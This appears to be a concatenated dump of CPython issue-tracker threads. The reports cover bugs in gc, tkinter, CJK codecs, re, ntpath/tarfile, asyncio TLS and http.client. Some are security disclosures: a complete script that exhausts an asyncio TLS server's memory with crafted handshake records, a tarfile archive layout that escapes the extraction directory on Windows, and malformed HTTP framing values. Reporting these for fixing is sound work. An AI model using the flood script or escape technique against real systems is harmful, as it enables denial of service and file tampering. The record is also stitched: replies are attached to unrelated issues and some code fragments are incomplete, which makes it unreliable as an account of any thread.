issues.title: [3.14] change in behaviour in gc.get_referrers(some_local)
issues.author: graingert
issues.bodyHTML:
Bug report

Bug description:

import gc

async def demo():
    class A:
        pass

    a = A()
    print(gc.get_referrers(a))


try:
    demo().send(None)
except StopIteration as e:
    print(f"{e.value=}")

on 3.11-3.13 this prints:

[]
e.value=None

on 3.14 this prints:

[<coroutine object demo at 0x7d00fff85000>]
e.value=None

this makes gc.get_referrers less useful in detecting cyclic garbage where I'd like to be able to make the assertion that the current frame is the only referrer to an Exception.

the alternative is to hold a weak reference to the object, delete the object and see if the weak reference is dead with the gc disabled. But then I don't get any debug information in my failing test of why the object is still alive.

thread.author: serhiy-storchaka
thread.html:
There are two, or even three, types of sentinels.

  • Intended to be used by the user, like dataclasses.KW_ONLY or os.path.ALL_BUT_LAST. Their repr should refer to the name by which they are accessible. Pickleability is also a good bonus.
  • Intended to be used as placeholders for default argument values. They should not be accessible by user. Their repr can be <not specified> or something like. They are not intended to be pickled either.
  • For internal use. The same as the previous case, but usually users should not see them at all.

>>> ast.dump(ast.parse('from ...............x import a'))
"Module(body=[ImportFrom(module='x', names=[alias(name='a')], level=15)])"

There's some history here: #92986 and #57645. I feel like we should fix this but maybe it's not worth the compatibility break.

"not worth the compatibility break" is a CBA, or more accurately, it is half of a CBA. What is the cost of not fixing the problem? Focusing on the "history", above, is a selection bias: often called survivorship bias.

The cost to those involved in the history is a knowable cost that can be mitigated. In stark contrast, the cost of not fixing is unknowable and difficult to impossible to mitigate.

The CBA in this case is simple.

issues.title: Crash in tkinter when passing a recursive or deeply nested list to Tcl

issues.bodyHTML:
Bug report

Bug description:

AsObj() and TupleAsObj() in Modules/_tkinter.c convert nested lists and tuples to Tcl lists by plain C recursion with no depth limit, so a recursive or very deeply nested list passed to tk.call(), setvar(), Variable.set() or a widget option overflows the C stack and segfaults.

import tkinter
v = ['a']
v.append(v)
tkinter.Tcl().setvar('x', v)  # Segmentation fault

The same happens with a list nested about 50,000 levels deep (for example one returned by json.loads()), and in the other direction when getvar() reads a Tcl list nested a few hundred thousand levels deep (FromObj()). I'd expect an exception, as _flatten() in the same file already gives with ValueError: nesting too deep in _flatten.

The recursion is old; gh-143310 fixed a different crash in the same code and was backported.

issues.title: CJK StreamWriter.reset() does not write the shift-back sequence
issues.author: gpshead
issues.bodyHTML:
Bug report

Bug description:

StreamWriter.reset() of the stateful CJK codecs (hz, iso2022_jp*, iso2022_kr) usually writes nothing. MultibyteStreamWriter.reset() returns early when self->pending is NULL, but pending only holds an unfinished combining character, not the shift state, so the codec's encreset (which writes ESC ( B, SI or ~}) is skipped and the writer stays in double-byte mode.

import codecs, io
out = io.BytesIO()
w = codecs.getwriter('iso2022_jp')(out)
w.write('こんにちは。')
w.reset()
print(out.getvalue())  # b'\x1b$B$3$s$K$A$O!#'

Expected b'\x1b$B$3$s$K$A$O!#\x1b(B', as str.encode() gives. Anything written after reset() is read in JIS X 0208 mode, and the next CJK text written by the same writer has no opening escape. hz gives b'~{Dc:C' for '你好' instead of b'~{Dc:C~}'.

This is a regression from the gh-67436 crash fix (2015, 3.4.4/3.5), which added the early return to avoid passing a NULL pending to the encoder; before that, reset() always ran the codec reset. The same function also leaks the result of stream.write().

thread.author: vstinner
thread.html: Implementing correctly stateful codecs is hard. The io module should handle this case correctly, whereas the codecs module has multiple issues related to stateful codecs. In 2011, I proposed https://peps.python.org/pep-0400/ to deprecate codecs.StreamReader and codecs.StreamWriter. But this PEP was not accepted (but deferred). I still think that we should deprecate these APIs. If they are used, they should be replaced by io.TextIOWrapper instead.

issues.title: ISO-2022 decoders accept charset designations into the wrong G set
issues.author: gpshead
issues.bodyHTML:
Bug report

Bug description:

iso2022processesc() in Modules/cjkcodecs/_codecs_iso2022.c only checks that a designated charset is in the codec's table, not that it is designated to the G set (G0/G1/G2) the encoding assigns it to. So iso2022_kr accepts ESC $ ( C and decodes the following ASCII as Korean, the iso2022_jp* codecs silently eat G1 designations they do not have, and iso2022_jp_2 can reach an internal error path that raises RuntimeError regardless of the error handler.

>>> b'abc\x1b$(Cdefg'.decode('iso2022_kr')
'abc鴨鉛'
>>> b'ab\x1b$)Bdef'.decode('iso2022_jp')
'abdef'
>>> b'\x1b.J\x1bNx'.decode('iso2022_jp_2', 'replace')
Traceback (most recent call last):
  ...
RuntimeError: internal codec error

The RuntimeError also comes out of email.message_from_bytes(...).get_filename() for a filename*=iso-2022-jp-2''a%1B.J%1BNx parameter. These escapes should raise UnicodeDecodeError like any other invalid sequence. Related: gh-153603 (same designation table, different bug).

The valid designations for each encoding are fixed by their RFCs: RFC 1468 (ISO-2022-JP: ESC ( B, ESC ( J, ESC $ @, ESC $ B, all G0), RFC 2237 (ISO-2022-JP-1 adds ESC $ ( D to G0), RFC 1554 (ISO-2022-JP-2 adds ESC $ A, ESC $ ( C, ESC $ ( D to G0 and ESC . A, ESC . F to G2) and RFC 1557 (ISO-2022-KR: only ESC $ ) C, designating KS C 5601 to G1). The designation mechanism itself is ISO/IEC 2022 / ECMA-35.

Bug description:

The following code crashes on 3.14.0a4 but runs without error on 3.13:

import dataclasses

def my_dataclass(cls):

class X:

with:

thread.author: ezio-melotti
thread.html:
In Python 2.6, socket.error was changed to be a child class of IOError
1. IOError derives from EnvironmentError 2, and EnvironmentError
accepts a 2-tuple used to set the values of the errno and strerror
attributes respectively 3.
Apparently the IOError raised by the socket module are instantiated
passing (always?) 'socket error' as first arg and an instance of
socket.gaierror, socket.timeout or socket.herror (and maybe others) as
second arg.
The errno attributes ends up being a string (and not a number) and the
strerror another exception (and not a str):

>>> import socket
>>> from urllib import urlopen
>>> socket.setdefaulttimeout(0.01)
>>> try: urlopen('http://www.python.org')
... except Exception, e: err1 = e
...
>>> err1
IOError('socket error', timeout('timed out',))
>>> err1.errno
'socket error'
>>> err1.strerror
timeout('timed out',)
>>> err1.strerror.errno
>>> err1.strerror.strerror
>>>

>>> try: urlopen('http://www.pythonfoobarbaz.org')
... except Exception, e: err2 = e
...
>>> err2
IOError('socket error', gaierror(11001, 'getaddrinfo failed'))
>>> err1.errno
'socket error'
>>> err1.strerror
timeout('timed out',)
>>> err1.strerror.errno
>>> err2.errno
'socket error'
>>> err2.strerror
gaierror(11001, 'getaddrinfo failed')
>>> err2.strerror.errno
11001
>>> err2.strerror.strerror
'getaddrinfo failed'

The 'socket error' strings doesn't provide any useful information
(herror, gaierror and timeout are already subclasses of socket.error)
and it results in confusing messages like:
IOError: [Errno socket error] [Errno 11001] getaddrinfo failed

The relevant information is not accessible directly on the error but it
is in err.strerror/err.args1.

IMHO the first arg should be the errno (if it's available) and the
second the message (e.g. 'getaddrinfo failed' or 'timed out').

The doc of socket.error 1 should be also changed because it says:
"The accompanying value is either a string telling what went wrong or a
pair (errno, string) representing an error returned by a system call,
similar to the value accompanying os.error." (and this is actually what
I'd like it to be, but right now it's something different.)

thread.author: amauryfa
thread.html:
No, it seems that 2.5 has the same problem. The 'socket error' message is
raised in urllib.py. The socket module is innocent to me...
It appears that this file routinely raises IOErrors, passing various
arguments, which are not stored properly in the IOError object. IMO it
should raise subclasses of IOError.
In this particular case of "socket error", it should let the exception
propagate. Other occurrences need more thinking.

thread.author: bitdancer
thread.html:
Yes, it looks to me like urllib is intentionally putting the 'socket
error' or 'url error' into the errno position in the IOError arguments.
Now that socket.error is an IOError, that at least seems wrong.

thread.author: ezio-melotti
thread.html:
Can this be fixed without breaking compatibility?
It also affects Python2.7 and maybe also Python 3.x (there the error is different and might be intentional).

Copy/pastable snippet to reproduce the error on 2.x:

try:
urlopen('http://www.pythonfoobarbaz.org')
except Exception, err:
print 'err:', err
print 'repr(err):', repr(err)
print 'err.errno:', err.errno
print 'err.strerror:', err.strerror
print 'err.strerror.errno:', err.strerror.errno
print 'err.strerror.strerror:', err.strerror.strerror

Result on 2.7:
err: [Errno socket error] [Errno -2] Name or service not known
repr(err): IOError('socket error', gaierror(-2, 'Name or service not known'))
err.errno: socket error
err.strerror: [Errno -2] Name or service not known
err.strerror.errno: -2
err.strerror.strerror: Name or service not known

Copy/pastable snippet to reproduce the error on 3.x:

try:
urlopen('http://www.pythonfoobarbaz.org')
except Exception as exc:
err = exc
print('err:', err)
print('repr(err):', repr(err))
print('err.errno:', err.errno)
print('err.strerror:', err.strerror)
print('err.reason:', err.reason)
print('err.reason.errno:', err.reason.errno)
print('err.reason.strerror:', err.reason.strerror)

Result on 3.2:
err: <urlopen error [Errno -2] Name or service not known>
repr(err): URLError(gaierror(-2, 'Name or service not known'),)
err.errno: None
err.strerror: None
err.reason: [Errno -2] Name or service not known
err.reason.errno: -2
err.reason.strerror: Name or service not known

thread.author: catherine
thread.html:
It's very hard to tell what ought to be done here, since Lib/urllib/request.py throws URLErrors with a great variety of order and number of arguments, and it's not clear how URLError (in Lib/urllib/error.py) intends to handle them.

However, in this case, AbstractHTTPHandler.do_open is instantiating URLError with another exception instance, and that exception contains .errno and .strerror. URLError puts the entire error instance into reason, where the information is hidden away as .reason.strno and .reason.strerror.

In the name of keeping this information available rather than hiding it, I'm attaching a patch that adds to URLError.__init__:

        if hasattr(reason, "errno"):
            self.errno = reason.errno
        if hasattr(reason, "strerror"):
            self.strerror = reason.strerror

Again, I'm not sure this is the most logical approach because I can't find a consistent pattern in the ways URLError is instantiated.

URLError.__init__ sets only args and reason, so the OSError attributes are never set.

issues.title: `re.Pattern.match()` matches and can read out of bounds when `pos > endpos`
issues.author: gpshead
issues.bodyHTML:
Bug report

Bug description:

re.Pattern.match() (and prefixmatch(), fullmatch(), scanner().match()) run the matching engine when pos > endpos, although the docs say "If endpos is less than pos, no match will be found". Zero-width patterns then return an empty match, and a MULTILINE $ reads the character at pos, which is one past the end of the buffer when pos == len(string). search() already returns None here.

import mmap, re

print(re.compile("").match("abc", 3, 1))    # <re.Match object; span=(3, 3), match=''>
print(re.compile("").search("abc", 3, 1))   # None

mm = mmap.mmap(-1, 2 * mmap.PAGESIZE)
mm.resize(mmap.PAGESIZE)                    # leaves the next page unmapped
re.compile(rb"$", re.M).match(mm, mmap.PAGESIZE, 0)   # Segmentation fault

Expected None from every call. str and bytes subjects are NUL terminated so the read stays in bounds for them; mmap and array.array subjects are not.

issues.title: `os.path.realpath()` on Windows misresolves a broken symlink reached through a directory symlink
issues.author: gpshead
issues.bodyHTML:
Bug report

Bug description:

On Windows, os.path.realpath() returns the wrong path for a broken relative symlink when the path used to reach it goes through a symlink to a directory. ntpath._readlink_deep() joins the link target to dirname() of the path as given, so a .. in the target removes the directory link's name instead of going up from the directory that contains the link. The join dates from bpo-38453 (GH-16967).

tarfile's data and tar extraction filters use this result to decide where a member will be written. Whoever supplies the archive can make extractall() create a new file outside the destination directory, in a directory that already exists, when the extracting process is able to create symlinks.

# Windows, with permission to create symlinks
import os
os.makedirs(r"C:\work\out")
os.symlink(".", r"C:\work\out\alias", target_is_directory=True)
os.symlink(r"..\outside\new.txt", r"C:\work\out\link")
print(os.path.realpath(r"C:\work\out\link"))
print(os.path.realpath(r"C:\work\out\alias\link"))

Both names are the same link, so both lines should be C:\work\outside\new.txt; the second is C:\work\out\outside\new.txt. Opening either name for writing creates C:\work\outside\new.txt.

An archive with the members alias -> ., alias/link -> ../outside/new.txt and a regular file alias/link is extracted by extractall(r"C:\work\out", filter="data") without error and the file's content ends up in C:\work\outside\new.txt. The same archive with the regular file named link raises OutsideDestinationError.

I have not run this on Windows. The output above comes from running the Windows branch of Lib/ntpath.py and Lib/tarfile.py from main on Linux over stand-ins for the nt functions, and from reading the code. test_realpath_broken_symlinks in test_ntpath already asserts the textual join (broken2, broken3). gh-88102, gh-85035 and gh-110495 are related realpath() issues but do not cover this case.

issues.title: asyncio TLS server memory grows without bound for a peer that stops reading
issues.author: gpshead
issues.bodyHTML:
Bug report

Bug description:

An asyncio TLS server keeps reading from a connected peer even when the peer never reads its own side, and records that OpenSSL answers on its own (a TLS 1.2 no_renegotiation alert per ClientHello, or a TLS 1.3 KeyUpdate reply) pile up unbounded in SSLProtocol's outgoing ssl.MemoryBIO. Write-side flow control only throttles application output, and _control_ssl_reading() looks only at the incoming buffer, which stays empty because OpenSSL has already consumed the input, so nothing stops the server from reading more.

A peer that controls only its own socket can hold the server's memory without limit and without any credentials.

The script below starts an ordinary streams TLS server and a TLS 1.2 client that completes the handshake, then stops reading and sends handshake records full of empty ClientHello messages. It needs a raw client because the ssl module will not send a handshake message inside an established session; it runs over loopback and needs libcrypto.so.3 for the record crafting.

expand to see script 
import asyncio
import ctypes
import hashlib
import hmac
import os
import socket
import ssl
import struct
import subprocess
import sys
import tempfile
import time

CERT = os.path.join(os.path.dirname(ssl.__file__), "test", "certdata", "keycert3.pem")
HANDSHAKE, APPLICATION_DATA = 22, 23
EMPTY_CLIENT_HELLO = bytes([1, 0, 0, 0])          # handshake type 1, 24-bit length 0


async def _serve():
    ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    ctx.load_cert_chain(CERT)

    async def handle(reader, writer):
        while line := await reader.readline():
            writer.write(b"you said " + line)
            await writer.drain()

    server = await asyncio.start_server(handle, "127.0.0.1", 0, ssl=ctx)
    print(server.sockets[0].getsockname()[1], flush=True)
    await server.serve_forever()


libcrypto = ctypes.CDLL("libcrypto.so.3")
libcrypto.EVP_CIPHER_CTX_new.restype = ctypes.c_void_p
libcrypto.EVP_aes_256_cbc.restype = ctypes.c_void_p
libcrypto.EVP_CIPHER_CTX_free.argtypes = [ctypes.c_void_p]
libcrypto.EVP_CIPHER_CTX_set_padding.argtypes = [ctypes.c_void_p, ctypes.c_int]
libcrypto.EVP_EncryptInit_ex.argtypes = [ctypes.c_void_p] * 3 + [ctypes.c_char_p] * 2
libcrypto.EVP_EncryptUpdate.argtypes = [ctypes.c_void_p, ctypes.c_char_p,
                                        ctypes.c_void_p, ctypes.c_char_p, ctypes.c_int]


def aes_256_cbc(key, iv, data):
    c = libcrypto.EVP_CIPHER_CTX_new()
    out, out_len = ctypes.create_string_buffer(len(data)), ctypes.c_int()
    libcrypto.EVP_EncryptInit_ex(c, libcrypto.EVP_aes_256_cbc(), None, key, iv)
    libcrypto.EVP_CIPHER_CTX_set_padding(c, 0)
    libcrypto.EVP_EncryptUpdate(c, out, ctypes.byref(out_len), data, len(data))
    libcrypto.EVP_CIPHER_CTX_free(c)
    return out.raw


def prf_sha384(secret, seed, size):
    a, out = seed, b""
    while len(out) < size:
        a = hmac.digest(secret, a, hashlib.sha384)
        out += hmac.digest(secret, a + seed, hashlib.sha384)
    return out[:size]


def connect(port):
    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
    sock.connect(("127.0.0.1", port))
    keylog = tempfile.NamedTemporaryFile()
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.maximum_version = ssl.TLSVersion.TLSv1_2
    ctx.set_ciphers("ECDHE-RSA-AES256-SHA384")
    ctx.keylog_filename = keylog.name
    incoming, outgoing = ssl.MemoryBIO(), ssl.MemoryBIO()
    tls = ctx.wrap_bio(incoming, outgoing)
    flight = b""
    while True:
        try:
            tls.do_handshake()
            break
        except ssl.SSLWantReadError:
            sock.sendall(outgoing.read())
            got = sock.recv(65536)
            flight += got
            incoming.write(got)
    _, client_random, master_secret = keylog.read().split()[-3:]
    server_random = flight[11:43]
    kb = prf_sha384(bytes.fromhex(master_secret.decode()),
                    b"key expansion" + server_random + bytes.fromhex(client_random.decode()), 160)
    return {"sock": sock, "mac_key": kb[:48], "key": kb[96:128], "seq": 1}


def send_records(client, content_type, payload, count):
    client["sock"].settimeout(3)
    sent = 0
    try:
        for _ in range(count):
            padding = 15 - len(payload) % 16
            iv = os.urandom(16)
            enc = iv + aes_256_cbc(client["key"], iv, payload + bytes([padding]) * (padding + 1))
            mac_in = struct.pack(">QBHH", client["seq"], content_type, 0x0303, len(enc)) + enc
            client["seq"] += 1
            enc += hmac.digest(client["mac_key"], mac_in, hashlib.sha384)
            client["sock"].sendall(struct.pack(">BHH", content_type, 0x0303, len(enc)) + enc)
            sent += len(enc) + 5
    except TimeoutError:
        pass
    return sent


def server_rss(pid):
    prev = -1
    while True:
        with open(f"/proc/{pid}/stat") as f:
            fields = f.read().rsplit(")", 1)[1].split()
        cpu = int(fields[11]) + int(fields[12])
        if cpu == prev:
            break
        prev = cpu
        time.sleep(1)
    with open(f"/proc/{pid}/statm") as f:
        return int(f.read().split()[1]) * os.sysconf("SC_PAGE_SIZE")


def flood(pid, client, content_type, payload):
    base = server_rss(pid)
    sent = 0
    for _ in range(3):
        sent += send_records(client, content_type, payload, 128)
    return sent, server_rss(pid) - base


if __name__ == "__main__":
    if sys.argv[1:] == ["--server"]:
        asyncio.run(_serve())
    server = subprocess.Popen([sys.executable, "-I", __file__, "--server"],
                              stdout=subprocess.PIPE, text=True)
    try:
        port = int(server.stdout.readline())
        sent, control = flood(server.pid, connect(port), APPLICATION_DATA, b"x" * 16383 + b"\n")
        print(f"request lines : {sent} bytes sent, server RSS grew {control} bytes")
        sent, observed = flood(server.pid, connect(port), HANDSHAKE, EMPTY_CLIENT_HELLO * 4096)
        print(f"ClientHellos  : {sent} bytes sent, server RSS grew {observed} bytes")
    finally:
        server.kill()

On unpatched main the 6.3 MB of ClientHello records grow the server's resident memory by about 170 MB and keep it there while the idle connection stays open, versus about 2 MB for the same volume of ordinary request lines; the application never sees any of the flooded data.

request lines : 6208813 bytes sent, server RSS grew 1966080 bytes
ClientHellos  : 6324096 bytes sent, server RSS grew 171606016 bytes

This is adjacent to gh-127655, where the unbounded output came from the application's writelines(); here OpenSSL writes it and the application is not involved.

thread.author: serhiy-storchaka
thread.html:
At the moment gzip can raise two errors on unexpected EOF: struct.error from struct.unpack() or TypeError from ord(). Both bz2 and lzma raise EOFError in such cases.

The proposed patch converts both truncated gzip errors to EOFError as for bz2 and lzma. Added similar tests for gzip, bz2 and lzma.

I doubt about backward compatibility. It's obvious that struct.error and TypeError are unintentional, and EOFError is purposed for this case. However users can catch undocumented but de facto exceptions and doesn't expect EOFError.

thread.author: nadeemvawda
thread.html:
I've reviewed the patch and posted some comments on Rietveld.

I doubt about backward compatibility. It's obvious that struct.error and TypeError are unintentional, and EOFError is purposed for this case. However users can catch undocumented but de facto exceptions and doesn't expect EOFError.

I think it's fine for us to change it to raise EOFError in these cases.

thread.author: serhiy-storchaka
thread.html:
Actually previous patch doesn't fix original problem, it only ensure that GzipFile consistent with BZ2File and LZMAFile.

To fix original problem we need other patch, and this patch looks as new feature for 3.4. Here is a sample patch for LZMAFile. BZ2File patch will be similar, and GzipFile patch will be more different and complex.

Now error doesn't raised immediately when read the file unexpectedly ended if some data can be read. Instead maximal possible part of read data returned and exception raising deferred to next read (see tests).

Perhaps we need a new flag for constructor or for read() which enables a new behavior (what will be a good name for this?). Or we can use a special value for size argument which means "read to the end as much as possible" (we can differentiate the behavior for size<0 and size=None). Unconditional enabling a new behavior for size >=0 is safe.

thread.author: nadeemvawda
thread.html:
I think the new behavior should be controlled by a constructor flag, maybe
named "defer_errors". I don't like the idea of adding the flag to read(),
since that makes us diverge from the standard file interface. Making a
distinction between size<0 and size=None seems confusing and error-prone,
not to mention that we (again) would have read() work differently from most
other file classes.

I'd prefer it if the new behavior is not enabled by default for size>=0,
even if this wouldn't break well-behaved code. Having a flag that only
controls the size<0 case is inelegant, and I don't think we should change
the default behavior unless there is a clear benefit to doing so.

From the patch, I would gather that the problem is that tk hard-codes shift-Tab to <<prev-window (and, I would expect, tab to <<next-window>>). (This works but is currently useless in the dialogs.) If that is so, why do they currently act the same (for me) in the editor? Does tk automatically rebind Tab to indent-region in a text widget?

thread.author: terryjreedy
thread.html:
<<PrevWindow>> is a predefined virtual event.
https://www.tcl.tk/man/tcl8.6/TkCmd/event.htm
I can't find <<NextWindow>> listed there. I don't remember if I actually saw it before mentioning it. While I like mimicking smart_indent, I don't know if we can dismiss Roger Serwy's concern in msg150059.

Tk on Ubuntu may report key name ISO_Left_Tab msg150059, but it is not cross-platform. On Win 10 with either tk 8.5.15 (2.7) or 8.6.6 (3.6):
_tkinter.TclError: bad event type or keysym "ISO_Left_Tab"
I don't think we need to use the only sometimes valid synonym.

As Sean Wolfe reported msg212906, Shift-Tab already dedents a single line by treating it as a region. This issue is about removing the extra behavior we don't want, and blocking Control-[ from doing simplefied non-region single line dedents. Smart_indent does this by intercepting Tab (which I believe need not be bound to <<indent-region>>.

When there is a selection within a line, smart_indent does not call dedent_region but deletes the selection and insert \t or spaces, but in the latter case, the cursor may not be left on a multiple of indent spaces. This does not seem very useful. It is even less so because if the selection is within a word, tab invokes autocomplete instead of smart_indent. This needs discussion on another issue.
---

Text editing tests: how to we do them both thoroughly and efficiently (in terms of both human writing and machine execution time)?

White box approach: Set up a class test fixture that defines cls.text = <MultiCall(Text) instance>; put text in known state (content, cursor position, selection); call edit function (smart_indent, proposed smart dedent, etc); check resulting state (content, cursor, selection. Repeat for multiple input state - output state pairs. These tests break if the function name is changed and only test the function, which is, however, the main thing to be tested.

Gray-box approach: Replace function calls with pseudoevents generated on the text widget. Such tests would survive function name changes, break on pseudoevent name changes, and add a test of pseudoevent -- function binding. A black-box approach replaces pseudoevents with concrete events -- simulated key presses, mouse clicks, and menu selections. These tests survive pseudoevent name changes and add a test of concrete -- pseudo event linkage. They should only break if we change the user visible interface, which we seldom do.

I think we should use all approaches in two sets of tests. The first set would test multiple before and after states in subtests with a function call. This would define and test the intended behavior of the function. The second set would test one before and after state successively with a function call, pseudoevent generation, and concrete event generations, in this order. (If the function call fails, the event tests are bound to fail.) This would test the user interface and the links to the underlying function.

There are over 30 editing functions to test, and writing the above for all would be tedious. After writing tests for a couple, we should write helper functions that embody the repetitive boilerplate.

An additional factor: The text edit functions, properly bound with a pseudoevent to the text instance, are not methods of the text instance (though they should be), but of the EditorWindow that also contains a Toplevel; Menu hierarchy; and a Frame that contains Scrollbars and a StatusBar, along with, finally, the MultiCall(Text) instance. thread.author: melicertes
thread.html:
email.Utils.parseaddr() does not successfully parse a
field value into a (comment, address) pair if the
address contains a source route with more than one hop.

i.e., it is successfully parses this:

"God" <@hop1.org:jeff@spec.org>

to get the address <jeff@spec.org>, but it fails to do
the same if supplied with a 2-hop source route:

"God" <@hop1.org,@hop2.net:jeff@spec.org>

In this case, it gets the comment ("God") right, but
fails to extract the address.

Multi-hop source routes, while deprecated, are still
valid in rfc2822.

thread.author: sdgathman
thread.html:
# A quick and very dirty fix for common broken cases, with test cases.

import rfc822

def parseaddr(t):
  """Split email into Fullname and address.
  >>> parseaddr('user@example.com')
  ('', 'user@example.com')
  >>> parseaddr('"Full Name" <foo@example.com>')
  ('Full Name', 'foo@example.com')
  >>> parseaddr('spam@viagra.com <foo@example.com>')
  ('spam@viagra.com', 'foo@example.com')
  >>> parseaddr('"God" <@hop1.org,@hop2.net:jeff@spec.org>')
  ('God', 'jeff@spec.org')
  """
  #return email.Utils.parseaddr(t)
  res = rfc822.parseaddr(t)
  # dirty fix for some broken cases
  if not res[0]:
    pos = t.find('<')
    if pos > 0 and t[-1] == '>':
      addrspec = t[pos+1:-1]
      pos1 = addrspec.rfind(':')
      if pos1 > 0:
        addrspec = addrspec[pos1+1:]
      return rfc822.parseaddr('"%s" <%s>' % (t[:pos].strip(),addrspec))
  if not res[1]:
    pos = t.find('<')
    if pos > 0 and t[-1] == '>':
      addrspec = t[pos+1:-1]
      pos1 = addrspec.rfind(':')
      if pos1 > 0:
        addrspec = addrspec[pos1+1:]
      return rfc822.parseaddr('%s<%s>' % (t[:pos].strip(),addrspec))
  return res

issues.title: http.client accepts Content-Length and chunk-size values that RFC 9112 forbids
issues.author: metsw24-max
issues.bodyHTML:
http.client derives the response body framing from int() of the Content-Length header and the chunked chunk-size line:

  • HTTPResponse.begin: self.length = int(length)
  • HTTPResponse._read_next_chunk_size: return int(line, 16)

RFC 9112 defines Content-Length = 1*DIGIT and chunk-size = 1*HEXDIG, but int() is more permissive: it accepts a leading +/-, underscores, surrounding whitespace and, in base 16, an 0x prefix and non-ASCII digits. So values like Content-Length: +5 / 5_0 and chunk sizes -5, +5, 0x5, 1_f are accepted and used to frame the body, while an RFC-compliant front end would reject them or frame the message differently (CWE-444).

Reproducer:

import http.client, io
class S:
    def __init__(s, d): s.f = io.BytesIO(d)
    def makefile(s, *a, **k): return s.f
def parse(raw):
    r = http.client.HTTPResponse(S(raw)); r.begin(); return r
raw = b'HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n+5\r\nHELLO\r\n0\r\n\r\n'
print(parse(raw).read())            # b'HELLO' -- '+5' is not a HEXDIG
raw = b'HTTP/1.1 200 OK\r\nContent-Length: 5_0\r\n\r\n' + b'A'*50
print(parse(raw).length)            # 50 -- '5_0' is not 1*DIGIT

The body-framing tokens should be validated against the grammar before being passed to int().

Linked PRs

  • gh-150752
  • gh-159020
  • gh-159021
  • gh-159156
  • gh-160770
  • gh-160771
  • gh-160772

thread.author: devdanzin
thread.html:
Three things that may be useful here.

1. There is an older issue covering part of this. gh-69926 ("multiple issues in http.client", open since 2015) has "negative chunk size accepted" as its first bullet. Worth linking so the two don't get fixed independently.

2. The negative chunk size has a concrete consequence beyond framing divergence, which may raise its priority. _read_next_chunk_size returns int(line, 16), and int(b"-1", 16) is -1 with no ValueError. That value then flows into _safe_read, where the pre-allocation clamp added by gh-119451 is min(amt, _MIN_READ_BUF_SIZE) — and min(-1, 1 << 20) == -1. So a negative chunk size disarms that clamp by sign: the read is no longer bounded by the buffer size. In _readinto_chunked, mvb[:chunk_left] likewise becomes mvb[:-1].

The guarded twin is in the same file: Content-Length has carried if self.length < 0: # ignore nonsensical negative lengths at HTTPResponse.begin since 2008. The chunk path never got the same check.

3. A defect in the current PR. In gh-150752, _read_next_chunk_size becomes:

line = line.strip()
if not _is_legal_chunk_size(line):
    raise ValueError("invalid chunk size")

The strip() is needed to remove the line terminator, but bare bytes.strip() removes SP TAB LF CR VT FF — so it runs before the grammar check and re-admits the surrounding whitespace the PR's own comment says it is rejecting:

b'5\r\n'      -> b'5'  passes
b' 5\r\n'     -> b'5'  passes      <- RFC 9112: chunk-size = 1*HEXDIG
b'\t5\r\n'    -> b'5'  passes
b'\x0b5\r\n'  -> b'5'  passes
b'\x0c5\r\n'  -> b'5'  passes
b'5 \r\n'     -> b'5'  passes

Stripping only the terminator (line.rstrip(b'\r\n'), or slicing it off) would keep the grammar check meaningful for whitespace as well as for sign and underscores.

Written with AI assistance; the clamp arithmetic and the strip table above were run, and the PR diff was read.

thread.author: encukou
thread.html:
There is an older issue covering part of this

Thanks for the link!
gh-69926 lists several issues; solving one of them here is fine.

The negative chunk size has a concrete consequence beyond framing divergence, which may raise its priority.

IMO, the divergence is worse.

Stripping only the terminator (line.rstrip(b'\r\n'), or slicing it off) would keep the grammar check meaningful for whitespace as well as for sign and underscores.

Beware, we're stripping chunk-extensions, which might include space before the semicolon. We should strip space and tab in that case. (Or parse & validate chunk-ext, but I don't think that's necessary.
I don't see a harm in keeping the strip() -- other parsers could reject extra whitespace but they shouldn't read a different value.

thread.author: danilablagorodniy37
thread.html:
gh-150752 introduced a regression on main: the compat32 header parser used by http.client keeps trailing SP/HTAB in a field value, so Content-Length: 5 now fails the 1*DIGIT check and is treated as a missing header. HTTPResponse.read() then blocks until the server closes the connection, which never happens on a keep-alive connection (3.15.0 returns the 5-byte body). RFC 9112 §5.1 requires parsers to exclude the OWS around a field value, and Go, llhttp, aiohttp and h11 all frame such a message with the parsed digits.

Fix in #159156. The open backports gh-159020 and gh-159021 carry the same regression.

issues.title: date.fromisoformat() silently ignores the last two characters of a 10-character basic-format string
issues.author: fitness-trener
issues.bodyHTML:
Bug report

Bug description:

date.fromisoformat() accepts a 10-character string in basic format and silently drops its last two characters:

>>> from datetime import date, datetime
>>> date.fromisoformat('2020010112')      # e.g. a YYYYMMDDHH stamp
datetime.date(2020, 1, 1)
>>> date.fromisoformat('2020W011xx')
datetime.date(2019, 12, 30)
>>> datetime.fromisoformat('2020010112')  # the datetime parser rejects it
ValueError: Invalid isoformat string: '2020010112'

date.fromisoformat admits inputs of length 7, 8 or 10. Both parse_isoformat_date() in Modules/_datetimemodule.c and _parse_isoformat_date() in Lib/_pydatetime.py read fixed-width fields from the start of the string, and neither checks that the whole string was consumed. A 10-character string without - at index 4 is therefore parsed as the 8-character basic date YYYYMMDD (or YYYYWwwD), and the trailing characters are ignored.

Such a string is not an ISO 8601 date, and it is not one of the documented exceptions. Because the result is a plausible date, a truncated or mistyped input (such as a 10-digit YYYYMMDDHH) goes unnoticed.

Checked on:

  • 3.11.15 with the C accelerator: the output above;
  • Lib/_pydatetime.py from main (7eada7c), run under 3.11.15: same results for both strings;
  • Modules/_datetimemodule.c on main: read, not built. The code path is unchanged.

Suggested fix: after the last field, require that the whole string has been consumed (p - dtstr == len in C, len(dtstr) == pos in Python). I have a draft patch with tests for both implementations and can open a PR if this is accepted.

Found by differential testing fromisoformat against an independent ISO 8601 implementation. I found no existing report; the nearest is gh-152204, which covers other pure-Python-only inputs.

3.11, CPython main branch

Operating systems tested on:

Windows

issues.title: `BZ2Decompressor` and `zlib._ZlibDecompressor` set `needs_input=True` while output is still buffered
issues.author: pganssle
issues.bodyHTML:
Bug description

When max_length cuts the output short and the call also consumes the whole input buffer, bz2.BZ2Decompressor and zlib._ZlibDecompressor set needs_input to True even though a decompress(b'') call would return more data. The documented meaning of the flag is the opposite: False means "there is buffered output, call again with b''"; True means "all output has been produced, feed more input".

>>> import bz2, zlib
>>> stream = bz2.compress(b"\x00\x10 0@" * 2)
>>> d = bz2.BZ2Decompressor()
>>> d.decompress(stream[:40], max_length=0)
b''
